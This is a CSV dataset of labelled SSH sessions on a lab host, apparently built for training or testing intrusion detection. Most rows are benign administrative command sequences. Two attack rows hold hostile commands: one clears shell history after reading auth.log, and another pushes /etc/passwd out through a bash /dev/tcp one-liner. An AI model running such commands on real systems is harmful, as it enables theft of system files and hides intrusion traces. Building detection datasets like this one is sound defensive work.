session_id,user,account,client_ip,target_ip,target_hostname,session_start,session_end,duration_sec,session_start_is_estimated,session_end_is_estimated,duration_sec_is_estimated,commands,event_types,raw_event_count,file_transfer_bytes,label,tactics,scenario,expected_rule_ids,mitre,source,split,persona,session_tag,composition,identity_is_synthetic,ip_is_synthetic,ts_is_synthetic,protocol,has_command_telemetry,start_time,end_time,duration_sec_feat,start_hour,off_hours_flag,is_weekend,command_count,unique_command_ratio,avg_command_length,command_entropy,flag_cred_access,flag_privesc,flag_persistence,flag_log_tamper,flag_recon,flag_exfil,new_source_ip_for_user,new_source_ip_globally,ip_foreign_to_user,distinct_source_ips_prior,distinct_source_ips_24h,source_ip_entropy
19fdc3a5376060cd000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:05:25.126+0000,2026-08-07T12:05:28.878+0000,3,False,False,False,"['echo TAG:atk_log_tamper_46d176', 'ls -la /var/log/', 'cat /var/log/auth.log 2>/dev/null | tail -20', 'history -c', 'last', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",8,0,attack,['log_tamper'],log_tamper,[100516],"['T1070', 'T1562']",real,eval,,atk_log_tamper_46d176,full,False,False,False,SSH,1,2026-08-07 12:05:25.126000+00:00,2026-08-07 12:05:28.878000+00:00,3.0,12,0,0,4,1.0,18.5,2.0,0,0,0,1,1,0,0,0,0,1,1,0.0
19fdc3a6a1325666000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:05:31.132+0000,2026-08-07T12:05:42.128+0000,11,False,False,False,"['echo TAG:ben_dba_c4c77c', 'du -ah --exclude=""/tmp""', 'du -ah --exclude=""/tmp""', ""grep -r 'panic' /var/log"", ""grep -l 'kernel' *.log"", ""grep '^$' file.txt"", 'du -B 512G', ""grep 'error' log.txt"", ""grep 'def' *.py"", 'df', 'du -B 5G', 'df -h --output=used', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",15,0,benign,[],dba,[],[],real,eval,dba,ben_dba_c4c77c,sampled,False,False,False,SSH,1,2026-08-07 12:05:31.132000+00:00,2026-08-07 12:05:42.128000+00:00,11.0,12,0,0,11,0.9090909090909091,16.727272727272727,3.2776134368191157,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc3aa57965ffc000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:05:46.199+0000,2026-08-07T12:05:54.879+0000,8,False,False,False,"[""grep '[0-9]' file.txt"", 'echo TAG:ben_dba_1a1ce5', ""grep '[0-9]' file.txt"", ""grep '[0-9]' file.txt"", 'cat < file.txt', 'cat -n file.txt', ""grep '[0-9]' file.txt"", 'du -S', ""grep '[0-9]' file.txt"", 'du -B 4P', ""grep 'home' /etc/fstab"", 'du --time=ctime', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",15,0,benign,[],dba,[],[],real,eval,dba,ben_dba_1a1ce5,sampled,False,False,False,SSH,1,2026-08-07 12:05:46.199000+00:00,2026-08-07 12:05:54.879000+00:00,8.0,12,0,0,11,0.6363636363636364,16.727272727272727,2.40400975732486,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc3ad3cecf843000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:05:58.128+0000,2026-08-07T12:06:05.377+0000,7,False,False,False,"['echo TAG:ben_auditor_fc7bff', 'ls -latu', 'ls -d */', 'cat /dev/urandom | head -c 16', 'ls -latu', 'find /data -path ""*/.bak"" -prune -o -type f -print', 'find /home -maxdepth 1 -type d', 'ls -RF', ""grep 'Failed login' /var/log/auth.log"", 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",12,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_fc7bff,sampled,False,False,False,SSH,1,2026-08-07 12:05:58.128000+00:00,2026-08-07 12:06:05.377000+00:00,7.0,12,0,0,8,0.875,22.0,2.75,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc3affe32c637000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:06:09.264+0000,2026-08-07T12:06:19.628+0000,10,False,False,False,"['echo TAG:ben_admin_6ea3bf', 'cd /var/lock', 'cd /var/lock', 'cd /usr/share/games', 'cd /usr/share/games', 'ls -ltur ~', 'cd /var/lock', 'ls -i', 'df -h --output=used', 'du -B 5G', 'cd /usr/share/games', 'ls -ltur ~', 'ls -lRt', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",16,0,benign,[],admin,[],[],real,eval,admin,ben_admin_6ea3bf,sampled,False,False,False,SSH,1,2026-08-07 12:06:09.264000+00:00,2026-08-07 12:06:19.628000+00:00,10.0,12,0,0,12,0.5833333333333334,12.666666666666666,2.6258145836939115,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc3b332502419000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:06:22.484+0000,2026-08-07T12:06:26.625+0000,4,False,False,False,"['echo TAG:ben_admin_b6718e', 'du -ah | sort -hr', 'df -i', 'ls -v', 'ls -lh /', 'du -B 64M', 'du -B 128K', 'exit']","['KBD_INPUT', 'SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",10,0,benign,[],admin,[],[],real,eval,admin,ben_admin_b6718e,sampled,False,False,False,SSH,1,2026-08-07 12:06:22.484000+00:00,2026-08-07 12:06:26.625000+00:00,4.0,12,0,0,6,1.0,9.0,2.584962500721156,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc3b4c33a7dd0000c291af8a6,test-ssh,p_admin,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:06:28.876+0000,2026-08-07T12:06:32.126+0000,3,False,False,False,"['echo TAG:atk_exfil_eec9c6', 'bash -c \'echo -e ""POST / HTTP/0.9\\n\\n$(</etc/passwd)"" >/dev/tcp/127.0.0.1/2222\'', ""df -h | awk '$5+0 < 20'"", 'ls -a ~', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",7,0,attack,['exfil'],exfil,[100520],"['T1048', 'T1041']",real,eval,,atk_exfil_eec9c6,diluted,False,False,False,SSH,1,2026-08-07 12:06:28.876000+00:00,2026-08-07 12:06:32.126000+00:00,3.0,12,0,0,3,1.0,36.333333333333336,1.584962500721156,1,0,0,0,0,0,0,0,0,1,1,0.0
19fdc3c8ff72e2b4000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:07:51.875+0000,2026-08-07T12:07:57.622+0000,5,False,False,False,"['echo TAG:ben_auditor_4aef1c', 'ls -ld /usr/*/', 'ls -ld /usr/*/', 'uptime', 'find /var/log -mtime -1', ""ls -l | grep '^l'"", 'ls -lF', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",10,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_4aef1c,sampled,False,False,False,SSH,1,2026-08-07 12:07:51.875000+00:00,2026-08-07 12:07:57.622000+00:00,5.0,12,0,0,6,0.8333333333333334,13.333333333333334,2.2516291673878226,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc3cb0090eeb1000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:07:59.873+0000,2026-08-07T12:08:05.827+0000,5,False,False,False,"['du -h', 'echo TAG:ben_dba_aa06b7', 'find /var -not -group wheel', 'du -ah --exclude=""/tmp""', 'du -ah /etc', ""grep -n 'main' main.c"", 'du -ah --exclude=""/tmp""', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",10,0,benign,[],dba,[],[],real,eval,dba,ben_dba_aa06b7,sampled,False,False,False,SSH,1,2026-08-07 12:07:59.873000+00:00,2026-08-07 12:08:05.827000+00:00,5.0,12,0,0,6,0.8333333333333334,18.333333333333332,2.2516291673878226,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc3cd687b0501000c291af8a6,test-ssh,p_dba,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:08:09.808+0000,2026-08-07T12:08:13.873+0000,3,False,False,False,"['echo TAG:ben_dba_4ad295', 'du -B 256K', ""grep '^#' script.sh"", 'df -h --output=source,fstype,pcent', 'df -h --output=source,fstype,pcent', 'exit']","['KBD_INPUT', 'SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",8,0,benign,[],dba,[],[],real,eval,dba,ben_dba_4ad295,sampled,False,False,False,SSH,1,2026-08-07 12:08:09.808000+00:00,2026-08-07 12:08:13.873000+00:00,3.0,12,0,0,4,0.75,24.25,1.5,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc3cf2e61514d000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:08:16.998+0000,2026-08-07T12:08:25.623+0000,8,False,False,False,"['echo TAG:ben_auditor_4c70e4', 'ls -lRh ~', 'cat -n file.txt', 'ls -lR', 'cat -n file.txt', 'cat -n file.txt', 'cat -n file.txt', 'find /tmp -maxdepth 1 -type f', ""grep 'Failed login' /var/log/auth.log"", 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION', 'KBD_INPUT']",12,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_4c70e4,sampled,False,False,False,SSH,1,2026-08-07 12:08:16.998000+00:00,2026-08-07 12:08:25.623000+00:00,8.0,12,0,0,8,0.625,17.625,2.0,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc3d1cadaff97000c291af8a6,test-ssh,p_dev,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:08:27.872+0000,2026-08-07T12:08:38.123+0000,10,False,False,False,"['echo TAG:ben_dev_fc6666', ""awk '$1 ~ /^[0-9]+$/' file.txt"", ""awk '$1 ~ /^[0-9]+$/' file.txt"", 'find /var -iregex "".*[0-9]{4}\\.txt""', 'find /data -regex "".*/2025/.*\\.txt""', ""awk '$1 ~ /^[0-9]+$/' file.txt"", 'tail file.txt', ""awk '{print NR, $0}' file.txt"", 'awk \'{gsub(""<TAB>"", "",""); print}\' file.txt', 'find /home -uid 1000', 'find /data -regex "".*/2025/.*\\.txt""', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",14,0,benign,[],dev,[],[],real,eval,dev,ben_dev_fc6666,sampled,False,False,False,SSH,1,2026-08-07 12:08:27.872000+00:00,2026-08-07 12:08:38.123000+00:00,10.0,12,0,0,10,0.7,29.5,2.6464393446710157,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc3d519a93eda000c291af8a6,test-ssh,p_audit,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:08:41.372+0000,2026-08-07T12:08:54.372+0000,12,False,False,False,"['echo TAG:ben_auditor_d713a4', 'ls -lX', 'ls -i', ""grep 'CRON' /var/log/syslog | grep 'CMD'"", 'ls -i', 'ls -S', 'ls -i', 'ls *.png *.jpg', ""cat file.txt | tr 'a-z' 'A-Z'"", 'find /tmp -not -newer /tmp/marker', 'ls ~', 'ls -d ~/*/', 'ls -lc', ""grep -v 'tmp' filelist.txt"", 'find /tmp -not -newer /tmp/marker', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",18,0,benign,[],auditor,[],[],real,eval,auditor,ben_auditor_d713a4,sampled,False,False,False,SSH,1,2026-08-07 12:08:41.372000+00:00,2026-08-07 12:08:54.372000+00:00,12.0,12,0,0,14,0.7857142857142857,15.785714285714286,3.3248629576173565,0,0,0,0,0,0,0,0,0,1,1,0.0
19fdc3d8eed29782000c291af8a6,test-ssh,bastionsvc,192.168.1.32,192.168.1.74,debian-lab,2026-08-07T12:08:57.121+0000,2026-08-07T12:09:04.120+0000,6,False,False,False,"['cd /usr/share/kde5', 'echo TAG:ben_admin_6ec2cd', 'free -b -w', 'cd /tmp', 'ls / /home', 'free -b -l', 'ls -l ..', 'free -b -l', 'du -shc /var', 'exit']","['SESSION_ESTABLISHED_SUCCESSFULLY', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'SESSION_DISCONNECTION']",12,0,benign,[],admin,[],[],real,eval,admin,ben_admin_6ec2cd,sampled,False,False,False,SSH,1,2026-08-07 12:08:57.121000+00:00,2026-08-07 12:09:04.120000+00:00,6.0,12,0,0,8,0.875,10.625,2.75,0,0,0,0,0,0,0,0,0,1,1,0.0
